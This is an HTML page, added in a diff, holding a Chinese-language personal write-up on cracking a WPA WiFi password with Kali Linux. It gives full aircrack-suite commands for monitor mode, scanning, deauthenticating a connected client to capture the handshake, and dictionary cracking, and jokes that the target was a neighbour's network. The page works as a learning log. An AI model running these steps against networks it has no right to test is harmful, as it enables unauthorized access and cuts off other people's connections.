@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Kali破解WiFi密码</title>
+
+    <link rel="stylesheet" href="styles/style.css">
+</head>
+<body>
+    <div id="container">
+        <header>
+            <h1>Kali Linux 破解WiFi密码</h1>
+            <p>作者：Talentq &nbsp;&nbsp; 时间：2020-2-18</p>
+        </header>
+
+        <section id="main">
+            <div class="first">
+                <h2>一、实验背景</h2>
+                <p class="indent">
+                    每次放假回家，饱受流量不足的煎熬。本来觉得忍忍就上学了，现在受疫情影响，开学推迟，还得上网课。于是网上买了网卡，决定 <span class="del">尝试破解附近的WiFi</span> 看看网卡长什么样。
+                </p>
+                <p class="indent">
+                    这是我第一次真正意义上成功的实践，仍有很多很多不懂的地方。本文记述一次实验，仅供日后参考学习。切记：网络并非法外之地！
+                </p>
+            </div>
+
+            <div class="first">
+                <h2>二、实验环境与准备</h2>
+                <ul>
+                    <li>主机：Windows 10，安装VMware</li>
+                    <li>虚拟机：Kali Linux</li>
+                    <li>其他：外置无线网卡，支持kali。（存疑：<span class="question">1.主机内嵌的网卡无法用于虚拟机扫描WiFi。 2.网卡芯片型号。 3.网卡驱动。</span>）</li>
+                </ul>
+            </div>
+
+            <div class="first">
+                <h2>三、实验原理</h2>
+                <p class="indent">
+                    将别人连接到WiFi的设备挤下线，利用它自动重连的空当获取四次握手的数据包，这数据包就是别人输入密码加密后的来来回回。获取握手数据包后，就可以离线跑密码字典了。
+                </p>
+                <p class="indent">
+                    没听懂不要紧，我再讲一遍。人家有密码，输入到手机上，通过手机自动加密变成了密文，发送给路由器。现在我获取了密文，我还有一大堆可能的密码。我用我的一大堆密码一个个试，kali会自动以相同的加密方式加密我们的密码，如果与我获取的密文一致，那就找到密码了。
+                </p>
+                <p class="indent">
+                    注意：本文方法为暴力破解，所需的密码字典自己想办法，我是自己生成的。另外要求，必须有其他设备已经连上了待破解的WiFi，这样才能有机会将对方挤下线获取握手数据包。
+                </p>
+            </div>
+
+            <div class="first">
+                <h2>四、实验步骤</h2>
+                <div class="second">
+                    <h3>1、打开kali虚拟机，插入无线网卡</h3>
+                    <p class="indent">①此时会自动弹出“检测到新的USB设备”对话框。<span class="bold">点击连接到虚拟机 -> 选择虚拟机名称 -> 点击确定</span>。</p>
+                    <div class="img"><img src="images/1.0.png" alt="找不到图片"></div>
+                    <p class="indent">②如果没有弹窗也可以这样将网卡接入虚拟机：<span class="bold">点击虚拟机 -> 可移动设备 -> 选择带有WLAN的，接入虚拟机</span>。</p>
+                    <div class="img"><img src="images/1.1.png" alt="找不到图片"></div>
+                </div>
+
+                <div class="second">
+                    <h3>2、打开命令行，输入ifconfig查看网卡信息，如果有wlan0则表示接入成功</h3>
+                    <div class="img"><img src="images/2.0.png" alt="找不到图片"></div>
+                </div>
+
+                <div class="second">
+                    <h3>3、输入命令：airmon-ng start wlan0，开启网卡监听模式 （存疑：<span class="question">传说中的混杂模式？</span>）</h3>
+                    <div class="img"><img src="images/3.0.png" alt="找不到图片"></div>
+                </div>
+
+                <div class="second">
+                    <h3>4、输入命令：iwconfig，查看网卡信息。wlan0mon后面加了mon则表示开启成功</h3>
+                    <div class="img"><img src="images/4.0.png" alt="找不到图片"></div>
+                </div>
+
+                <div class="second">
+                    <h3>5、输入命令：airodump-ng wlan0mon，开始扫描WiFi</h3>
+                    <p class="indent">①扫描一会儿，看到自己目标WiFi后，就可以按Ctrl c 结束扫描。</p>
+                    <div class="img"><img src="images/5.0.png" alt="找不到图片"></div>
+                    <p class="indent">②BSSID：wifi路由器的MAC地址；PWR：信号强弱程度，数值越小信号越强；#DATA：数据量，越大使用的人就越多；CH：信道频率；ESSID：wifi的名称，有说中文可能会有乱码的，我的没有乱码。</p>
+                </div>
+
+                <div class="second">
+                    <h3>6、开始抓包</h3>
+                    <h4>①输入命令：airodump-ng --bssid BSSID -c 信道频率 -w 数据包的存储路径 wlan0mon</h4>
+                    <p class="indent">参数解释：--bssid后面的BSSID即路由器的Mac地址；-c后接信道频率（CH）；-w后面接抓到的数据包的存储路径；wlan0mon为网卡名。</p>
+                    <p class="indent">例如：airodump-ng --bssid 4C:D1:A1:B0:03:00 -c 11 -w ./Test_wifi/ wlan0mon，我当前目录是桌面，将抓的包放在桌面上的Test_wifi文件夹里。</p>
+                    <div class="img"><img src="images/6.0.png" alt="找不到图片"></div>
+
+                    <h4>②此时新建另一个命令行终端，输入命令：airepaly-ng -0 0 -a BSSID -c 对方的手机Mac地址 网卡名</h4>
+                    <p class="indent">
+                        参数解释：-0后面的参数0表示一直攻击对方手机, -0 10就攻击10次。-a 后面接路由器的Mac地址。-c后面接对方连接WiFi设备的Mac地址。
+                        其中路由器Mac地址即上图中的BSSID；对方连接WiFi设备地址即上图中的STATION，有几个STATION就有几个连着WiFi的设备，任选一个；网卡名通常为wlan0mon。
+                    </p>
+                    <p class="indent">例如：aireplay-ng -0 0 -a 4C:D1:A1:B0:03:00 -c 58:E6:BA:E3:12:BC wlan0mon</p>
+                    <div class="img"><img src="images/6.1.png" alt="找不到图片"></div>
+
+                    <h4>③当第一个命令行终端出现 WPA handshake 时，表示成功获取握手数据包。此时两个命令行终端都按Ctrl c停止，否则被攻击手机会一直断网。</h4>
+                    <div class="img"><img src="images/6.2.png" alt="找不到图片"></div>
+                </div>
+
+                <div class="second">
+                    <h3>7、切换至抓包存储目录，查看文件</h3>
+                    <div class="img"><img src="images/7.0.png" alt="找不到图片"></div>
+                    <p class="indent">
+                        这里我犯了一个错误，之前写抓包存储路径我写的是./Test_wifi/，如果写成./Test_wifi/test的话，生成的抓包文件名称就是test-01了。而我的文件名称现在是-01。
+                        我们能用到的文件是后缀为.cap的那个文件。后面要把文件名写到命令行里面，Linux可能把-开头的当成了命令，所以为了避免问题，我把文件-01.cap重命名为01.cap。
+                        尴尬的是由于Linux把-01.cap当成了命令，我无法通过命令行修改名称，只能在图形界面里选中文件，按F2重命名。
+                        （存疑：<span class="question">1.其他文件有啥用？2.文件01.cap里面有那么多数据包，不是说只用到握手数据包吗，其他的包对破解不就是干扰吗？</span>）
+                    </p>
+                    <div class="img"><img src="images/7.1.png" alt="找不到图片"></div>
+                </div>
+
+                <div class="second">
+                    <h3>8、离线跑字典</h3>
+                    <p class="indent">好了，现在只要有文件01.cap和一个txt文件（即字典），就可以为所欲为了！</p>
+                    <p class="indent">字典就是一个txt文件，里面每一行是一个密码。Linux里面有一个crunch命令，生成密码及其好用，你自己去查一查。Kali也有自带的字典，不过我觉得不适合。</p>
+                    
+                    <h4>① 命令行输入：aircrack-ng -w 字典路径 文件.cap路径</h4>
+                    <p class="indent">例如：aircrack-ng -w /mnt/hgfs/ShareFolder/passwd/passwd0.txt 01.cap。按下Enter键，就开始破解了！</p>
+                    <div class="img"><img src="images/8.0.png" alt="找不到图片"></div>
+
+                    <h4>②破解成功显示如下</h4>
+                    <div class="img"><img src="images/8.1.png" alt="找不到图片"></div>
+
+                    <h4>③破解失败显示如下</h4>
+                    <div class="img"><img src="images/8.2.png" alt="找不到图片"></div>
+                </div>
+            </div>
+
+            <div class="first">
+                <h2>五、结语</h2>
+                <div class="second">
+                    <h4>①心理感受</h4>
+                    <p class="indent">
+                        虽然我也只是根据网上的教程，一步步进行，但中途遇到了很多小问题，也解决了很多问题，一步步探索。
+                        我超级开心，因为我成功 <span class="del">破解了邻居的WiFi</span> 增进了邻里关系。花费了一个下午和一个晚上的时间，主要在于字典，生成什么样的字典。
+                        当然还得有一个无线网卡，我去年就是因为没有网卡放弃了，这次网卡一到就迫不及待地尝试了。我太开心了，这算是我第一次成功的实践尝试。
+                    </p>
+
+                    <h4>②关于WiFi密码</h4>
+                    <p class="indent">
+                        我还是比较幸运的，因为WiFi密码可以设置得很复杂。WiFi密码可以设置成8 ~ 63位，每一位可能性包含数字、大小写字母、符号。
+                        我使用华为键盘输入WiFi密码的时候，发现每一位有116种可能性。总的数量就是：Total = 116<sup>8</sup> + 116<sup>9</sup> + 116<sup>10</sup> + ... + 116<sup>63</sup>.
+                    </p>
+                    <p class="indent">
+                        我把虚拟机设置成1个处理器，4个内核，把主机的CPU跑满，峰值时大约是每秒9500个，相比于Total，差不多跑到宇宙毁灭那天才行。
+                        而且后来我发现，在输入WiFi密码时虽然不可以输入中文，但可以复制上去，亲测中文也可以作为密码，那就算每秒的跑数量等效于，
+                        原来以一个宇宙毁灭时间所跑的数量来算，也得跑到这个宇宙小人生活的那个宇宙宇宙毁灭才行。
+                    </p>
+
+                    <h4>③可持续发展</h4>
+                    <p class="indent">
+                        那就太多了，说白了，我也只会个照葫芦画瓢的操作。
+                        无线网卡工作原理；air-的命令；wep，wpa/wpa2加密方式；802.11协议格式；握手包过程和加密步骤；crunch命令生成自定义字典；HTML布局；
+                    </p>
+                    <p class="indent">有人说现在暴力破解就像是拿棉花砸人。只有虚心学习，不断钻研，才会一步步掌握新的技术。咸鱼想翻身，菜鸟想打架，小白也想慢慢着墨。</p>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            &copy; 2020, Talentq
+            <br>
+            长长的路，慢慢地走
+        </footer>
+    </div>
+</body>
+</html>
